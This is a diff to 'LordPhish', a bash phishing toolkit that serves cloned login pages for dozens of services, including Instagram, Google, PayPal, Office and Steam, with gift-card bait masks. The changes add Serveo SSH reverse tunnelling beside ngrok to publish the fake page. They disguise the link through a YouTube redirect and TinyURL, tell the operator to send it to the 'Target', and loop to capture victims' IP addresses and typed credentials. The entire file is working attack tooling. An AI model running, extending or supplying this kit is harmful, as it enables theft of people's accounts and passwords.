@@ -67,7 +67,7 @@ echo -e "$R ╔╝$W█$R╚══╦═╦══╦╩═╦═╦═╩╝"
 echo -e "$R╔╝$W█████$R║$W█$R║$W██$R║$W██$R║$W█$R║"
 echo -e "$R║$W██████$R║$W█████████$R║\033[00m"
 echo
-printf "      \e[1;97m    Version 1.3 Beta      \e[0m\n"
+printf "      \e[1;97m    Version 1.4 Beta      \e[0m\n"
 printf "\n"
 printf "   \e[92m[\e[37;1m+\e[92m]\e[0m\e[33;1m Tool Created by Gr3n0xX (Ch33chSec)\e[0m\n"
 printf "\n"
@@ -119,16 +119,16 @@ facebook
 
 elif [[ $menu_option == 3 || $menu_option == 03 ]]; then
 server="snapchat"
-start
+start1
 
 elif [[ $menu_option == 4 || $menu_option == 04 ]]; then
 server="Twitter"
 mask='unlimited-onedrive-space-for free'
-start
+start1
 
 elif [[ $menu_option == 5 || $menu_option == 05 ]]; then
 server="github"
-start
+start1
 
 elif [[ $menu_option == 6 || $menu_option == 06 ]]; then
 server="Google"
@@ -136,181 +136,181 @@ Google
 
 elif [[ $menu_option == 7 || $menu_option == 07 ]]; then
 server="Spotify"
-start
+start1
 
 elif [[ $menu_option == 8 || $menu_option == 08 ]]; then
 server="Netflix"
 mask='get-blue-badge-on-twitter-free'
-start
+start1
 
 elif [[ $menu_option == 9 || $menu_option == 09 ]]; then
 server="Paypal"
-start
+start1
 
 elif [[ $menu_option == 10 ]]; then
 server="origin"
-start
+start1
 
 elif [[ $menu_option == 11 ]]; then
 server="steam"
 mask='steam-500-usd-gift-card-free'
-start
+start1
 
 elif [[ $menu_option == 12 ]]; then
 server="yahoo"
-start
+start1
 
 elif [[ $menu_option == 13 ]]; then
 server="linkedin"
-start
+start1
 
 elif [[ $menu_option == 14 ]]; then
 server="protonmail"
-start
+start1
 
 elif [[ $menu_option == 15 ]]; then
 server="wordpress"
-start
+start1
 
 elif [[ $menu_option == 16 ]]; then
 server="Microsoft"
-start
+start1
 
 elif [[ $menu_option == 17 ]]; then
 server="instafollowers"
-start
+start1
 
 elif [[ $menu_option == 18 ]]; then
 server="shopping"
-start
+start1
 
 elif [[ $menu_option == 19 ]]; then
 lol
 
 elif [[ $menu_option == 20 ]]; then
 server="pinterest"
-start
+start1
 
 elif [[ $menu_option == 21 ]]; then
 server="cryptocurrency"
-start
+start1
 
 elif [[ $menu_option == 22 ]]; then
 server="verzion"
-start
+start1
 
 elif [[ $menu_option == 23 ]]; then
 server="dropbox"
-start
+start1
 
 elif [[ $menu_option == 24 ]]; then
 server="adobe"
-start
+start1
 
 elif [[ $menu_option == 25 ]]; then
 server="Shopfy"
-start
+start1
 
 elif [[ $menu_option == 26 ]]; then
 server="Messenger"
-start
+start1
 
 elif [[ $menu_option == 27 ]]; then
 server="gitlab"
-start
+start1
 
 elif [[ $menu_option == 28 ]]; then
 server="twitch"
-start
+start1
 
 elif [[ $menu_option == 29 ]]; then
 server="myspace"
-start
+start1
 
 elif [[ $menu_option == 30 ]]; then
 server="badoo"
-start
+start1
 
 elif [[ $menu_option == 31 ]]; then
 server="vk"
-start
+start1
 
 elif [[ $menu_option == 32 ]]; then
 server="yandex"
-start
+start1
 
 elif [[ $menu_option == 33 ]]; then
 server="devianart"
-start
+start1
 
 elif [[ $menu_option == 34 ]]; then
 server="stackoverflow"
-start
+start1
 
 elif [[ $menu_option == 35 ]]; then
 server="gmail"
-start
+start1
 
 elif [[ $menu_option == 36 ]]; then
 server="Tiktok"
-start
+start1
 
 elif [[ $menu_option == 37 ]]; then
 server="Whatsapp"
-start
+start1
 
 elif [[ $menu_option == 38 ]]; then
 server="starbucks"
-start
+start1
 
 elif [[ $menu_option == 39 ]]; then
 server="firmware"
-start
+start1
 
 elif [[ $menu_option == 40 ]]; then
 server="gopro"
-start
+start1
 
 elif [[ $menu_option == 41 ]]; then
 server="apple"
-start
+start1
 
 elif [[ $menu_option == 42 ]]; then
 server="bitcoin"
-start
+start1
 
 elif [[ $menu_option == 43 ]]; then
 server="freefire"
-start
+start1
 
 elif [[ $menu_option == 44 ]]; then
 server="oofc365"
-start
+start1
 
 elif [[ $menu_option == 45 ]]; then
 server="playstation"
 mask='playstation-500-usd-gift-card-free'
-start
+start1
 
 elif [[ $menu_option == 46 ]]; then
 server="Amazon"
-start
+start1
 
 elif [[ $menu_option == 47 ]]; then
 server="Pubg"
-start
+start1
 
 elif [[ $menu_option == 48 ]]; then
 server="Pornhub"
-start
+start1
 
 elif [[ $menu_option == 49 ]]; then
 server="Xvideos"
-start
+start1
 
 elif [[ $menu_option == 50 ]]; then
 server="Codm"
-start
+start1
 
 elif [[ $menu_option == 0 || $menu_option == 00 ]]; then
 sleep 1
@@ -321,7 +321,7 @@ exit 1
 elif [[ $menu_option == 99 ]]; then
 server="create"
 createpage
-start
+start1
 
 elif [[ $menu_option == Y ]]; then
 banner
@@ -376,7 +376,7 @@ echo -e "$blue
              \n"
 echo
 echo
-printf "      \e[1;97m    Version 1.3 Beta      \e[0m\n"
+printf "      \e[1;97m    Version 1.4 Beta      \e[0m\n"
 printf "\n"
 printf "   \e[92m[\e[37;1m+\e[92m]\e[0m\e[33;1m Tool Created by Gr3n0xX (Ch33chSec)\e[0m\n"
 printf "\n"
@@ -400,19 +400,19 @@ read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: 
 
 if [[ $lol_option == 1 || $lol_option == 01 ]]; then
 server="lol"
-start
+start1
 
 elif [[ $lol_option == 2 || $lol_option == 02 ]]; then
 server="createLOL"
-start
+start1
 
 elif [[ $lol_option == 3 || $lol_option == 03 ]]; then
 server="lol"
-start
+start1
 
 elif [[ $lol_option == 4 || $lol_option == 04 ]]; then
 server="lol"
-start
+start1
 
 else
 printf "\n\n  \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
@@ -435,19 +435,19 @@ read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: 
 
 if [[ $insta_option == 1 || $insta_option == 01 ]]; then
 server="instagram"
-start
+start1
 
 elif [[ $insta_option == 2 || $insta_option == 02 ]]; then
 server="cpr"
-start
+start1
 
 elif [[ $insta_option == 3 || $insta_option == 03 ]]; then
 server="mcp"
-start
+start1
 
 elif [[ $insta_option == 4 || $insta_option == 04 ]]; then
 server="cip"
-start
+start1
 
 else
 printf "\n\n  \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
@@ -476,35 +476,35 @@ read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: 
 
 if [[ $fb_option == 1 || $fb_option == 01 ]]; then
 server="face_deskStat"
-start
+start1
 
 elif [[ $fb_option == 2 || $fb_option == 02 ]]; then
 server="face_deskStat"
-start
+start1
 
 elif [[ $fb_option == 3 || $fb_option == 03 ]]; then
 server="face_deskStat"
-start
+start1
 
 elif [[ $fb_option == 4 || $fb_option == 04 ]]; then
 server="face_deskStat"
-start
+start1
 
 elif [[ $fb_option == 5 || $fb_option == 05 ]]; then
 server="face_deskStat"
-start
+start1
 
 elif [[ $fb_option == 6 || $fb_option == 06 ]]; then
 server="face_deskStat"
-start
+start1
 
 elif [[ $fb_option == 7 || $fb_option == 07 ]]; then
 server="face_deskStat"
-start
+start1
 
 elif [[ $fb_option == 7 || $fb_option == 07 ]]; then
 server="face_deskStat"
-start
+start1
 
 else
 printf "\n\n  \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
@@ -523,7 +523,7 @@ Google() {
     
 if [[ $google_menu == 1 ]]; then
 server="Google_pc"
-start
+start1
     
 elif [[ $google_menu == 2 ]]; then
 list_gm
@@ -542,11 +542,11 @@ list_gm() {
     read -p $'\n\e[41m\e[1;36mLordPhish>>\e[0m\e[1;32m \en' 
 if [[ $option == 1 ]]; then
 server="Google_mobile"
-start
+start1
     
 elif [[ $option == 2 ]]; then
 server="Google_mobile2"
-start
+start1
 
 else
 printf "\e[1;93m [!] Invalid option!\e[0m\n"
@@ -554,7 +554,40 @@ menu
 fi
 }
 
+microsoft_ofice() {
+    banner
+    printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;96m Exel\e[0m\n"
+    printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;96m OneNote\e[0m\n"
+    printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;96m PowerPoint\e[0m\n"
+    printf "\e[1;92m[\e[0m\e[1;77m04\e[0m\e[1;92m]\e[0m\e[1;96m SharePoint\e[0m\n"
+    printf "\e[1;92m[\e[0m\e[1;77m05\e[0m\e[1;92m]\e[0m\e[1;96m Word\e[0m\n"
+    read -p $'\n\e[41m\e[1;36mLordPhish>>\e[0m\e[1;32m \en' ofice_menu
+    
+if [[ $ofice_menu == 1 ]]; then
+server="Exel"
+start1
 
+elif [[ $ofice_menu == 2 ]]; then
+server="OneNote"
+start1
+
+elif [[ $ofice_menu == 3 ]]; then
+server="PowerPoint"
+start1
+
+elif [[ $ofice_menu == 4 ]]; then
+server="SharePoint"
+start1
+
+elif [[ $ofice_menu == 5 ]]; then
+server="Word"
+start1
+
+else
+printf "\e[1;93m [!] Invalid option!\e[0m\n"
+menu
+fi
+}
 createpage() {
 default_cap1="Wi-fi Session Expired"
 default_cap2="Please login again."
@@ -599,41 +632,6 @@ printf '</html>\n' >> sites/create/login.html
 
 }
 
-microsoft_ofice() {
-    banner
-    printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;96m Exel\e[0m\n"
-    printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;96m OneNote\e[0m\n"
-    printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;96m PowerPoint\e[0m\n"
-    printf "\e[1;92m[\e[0m\e[1;77m04\e[0m\e[1;92m]\e[0m\e[1;96m SharePoint\e[0m\n"
-    printf "\e[1;92m[\e[0m\e[1;77m05\e[0m\e[1;92m]\e[0m\e[1;96m Word\e[0m\n"
-    read -p $'\n\e[41m\e[1;36mLordPhish>>\e[0m\e[1;32m \en' ofice_menu
-    
-if [[ $ofice_menu == 1 ]]; then
-server="Exel"
-start
-
-elif [[ $ofice_menu == 2 ]]; then
-server="OneNote"
-start
-
-elif [[ $ofice_menu == 3 ]]; then
-server="PowerPoint"
-start
-
-elif [[ $ofice_menu == 4 ]]; then
-server="SharePoint"
-start
-
-elif [[ $ofice_menu == 5 ]]; then
-server="Word"
-start
-
-else
-printf "\e[1;93m [!] Invalid option!\e[0m\n"
-menu
-fi
-}
-
 catch_cred() {
 
 account=$(grep -o 'Account:.*' sites/$server/usernames.txt | cut -d " " -f2)
@@ -645,6 +643,10 @@ cat sites/$server/usernames.txt >> sites/$server/saved.usernames.txt
 printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m sites/%s/saved.usernames.txt\e[0m\n" $server
 killall -2 php > /dev/null 2>&1
 killall -2 ngrok > /dev/null 2>&1
+killall ssh > /dev/null 2>&1
+if [[ -e sendlink ]]; then
+rm -rf sendlink
+fi
 exit 1
 
 }
@@ -750,6 +752,51 @@ rm -rf iptracker.log
 getcredentials
 }
 
+##
+serverx() {
+printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
+cd sites/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 &
+sleep 2
+printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Starting server...\e[0m\n"
+command -v ssh > /dev/null 2>&1 || { echo >&2 "I require SSH but it's not installed. Install it. Aborting."; exit 1; }
+if [[ -e sendlink ]]; then
+rm -rf sendlink
+fi
+$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:'$port' serveo.net 2> /dev/null > sendlink ' &
+printf "\n"
+sleep 10 # &
+send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
+printf "\n"
+printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Send the direct link to target:\e[0m\e[1;77m %s \n' $send_link
+send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$send_link | head -n1)
+printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Or using tinyurl:\e[0m\e[1;77m %s \n' $send_ip
+printf "\n"
+checkfound
+
+
+}
+
+startx() {
+if [[ -e sites/$server/ip.txt ]]; then
+rm -rf sites/$server/ip.txt
+
+fi
+if [[ -e sites/$server/usernames.txt ]]; then
+rm -rf sites/$server/usernames.txt
+
+fi
+
+default_port="3333" #$(seq 1111 4444 | sort -R | head -n1)
+printf '\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose a Port (Default:\e[0m\e[1;77m %s \e[0m\e[1;92m): \e[0m' $default_port
+read port
+port="${port:-${default_port}}"
+serverx
+
+}
+
+
+##
+
 start() {
 if [[ -e sites/$server/ip.txt ]]; then
 rm -rf sites/$server/ip.txt
@@ -764,13 +811,13 @@ fi
 if [[ -e ngrok ]]; then
 echo ""
 else
-clear
-banner
+command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
+command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
 printf "\e[1;92m[\e[0m*\e[1;92m] Downloading Ngrok...\n"
 arch=$(uname -a | grep -o 'arm' | head -n1)
 arch2=$(uname -a | grep -o 'Android' | head -n1)
 if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
-wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1
+wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1
 
 if [[ -e ngrok-stable-linux-arm.zip ]]; then
 unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
@@ -784,7 +831,7 @@ fi
 
 
 else
-wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1
+wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1
 if [[ -e ngrok-stable-linux-386.zip ]]; then
 unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
 chmod +x ngrok
@@ -795,8 +842,7 @@ exit 1
 fi
 fi
 fi
-clear
-banner
+
 printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
 cd sites/$server && php -S 127.0.0.1:3333 > /dev/null 2>&1 &
 sleep 2
@@ -804,13 +850,44 @@ printf "\e[1;92m[\e[0m*\e[1;92m] Starting ngrok server...\n"
 ./ngrok http 3333 > /dev/null 2>&1 &
 sleep 10
 
-link=$(curl -s -N http://127.0.0.1:4040/status | grep -o "https://[0-9a-z]*\.ngrok.io")
-printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Victim:\e[0m\e[1;77m %s\e[0m\n" $link
+link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
+printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Target:\e[0m\e[1;77m %s\e[0m\n" $link
+send_ip=$(curl -s "http://tinyurl.com/api-create.php?url=https://www.youtube.com/redirect?v=636B9Qh-fqU&redir_token=j8GGFy4s0H5jIRVfuChglne9fQB8MTU4MjM5MzM0N0AxNTgyMzA2OTQ3&event=video_description&q=$link" | head -n1)
+#send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$send_link | head -n1)
+printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Or using tinyurl:\e[0m\e[1;77m %s \n' $send_ip
+printf "\n"
+
 checkfound
+}
+
+start1() {
+if [[ -e sendlink ]]; then
+rm -rf sendlink
+fi
+
+
+printf "\n"
+printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net (SSH Tunelling, Best!)\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
+default_option_server="1"
+read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose a Port Forwarding option: \e[0m\en' option_server
+option_server="${option_server:-${default_option_server}}"
+if [[ $option_server == 1 || $option_server == 01 ]]; then
+startx
+
+elif [[ $option_server == 2 || $option_server == 02 ]]; then
+start
+else
+printf "\e[1;93m [!] Invalid option!\e[0m\n"
+sleep 1
+clear
+start1
+fi
+
 }
 checkfound() {
 
-
+printf "\n"
 printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting victim open the link ...\e[0m\n"
 while [ true ]; do
 
@@ -818,9 +895,15 @@ while [ true ]; do
 if [[ -e "sites/$server/ip.txt" ]]; then
 printf "\n\e[1;92m[\e[0m*\e[1;92m] IP Found!\n"
 catch_ip
-
+rm -rf sites/$server/ip.txt
 fi
-sleep 1
+sleep 0.5
+if [[ -e "sites/$server/usernames.txt" ]]; then
+printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Credentials Found!\n"
+catch_cred
+rm -rf sites/$server/usernames.txt
+fi
+sleep 0.5
 done
 
 }
